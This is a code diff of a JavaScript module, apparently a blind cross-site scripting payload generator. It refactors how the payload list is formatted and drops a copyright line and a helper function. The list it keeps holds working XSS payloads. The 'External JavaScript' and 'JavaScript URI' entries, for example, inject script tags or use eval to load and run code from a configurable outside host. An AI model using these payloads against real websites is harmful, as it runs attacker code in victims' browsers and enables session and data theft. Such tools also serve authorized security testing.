@@ -1,17 +1,9 @@
-// Copyright 2019 Lewis Ardern. All rights reserved.
-
-function buildPayloadStructure(payloads) {
-  let structuredPayloads = '';
-  payloads.map(payload => {
-    structuredPayloads += `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`;
-    return structuredPayloads;
-  });
-  return structuredPayloads;
-}
-
 exports.generatePayloads = config => {
   const payloads = [
-    { description: 'External JavaScript', payload: `"><script src="//${config.url}/m"></script>` },
+    {
+      description: 'External JavaScript',
+      payload: `"><script src="//${config.url}/m"></script>`
+    },
     {
       description: 'JavaScript URI',
       payload: `javascript:eval("var _ = document.createElement('script');_.src='//${
@@ -130,7 +122,7 @@ exports.generatePayloads = config => {
       }/m\\';document.getElementsByTagName(\\'body\\')[0].appendChild(_)')">`
     }
   ];
-  const structured = buildPayloadStructure(payloads);
-
-  return structured;
+  return payloads
+    .map(payload => `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`)
+    .join('');
 };
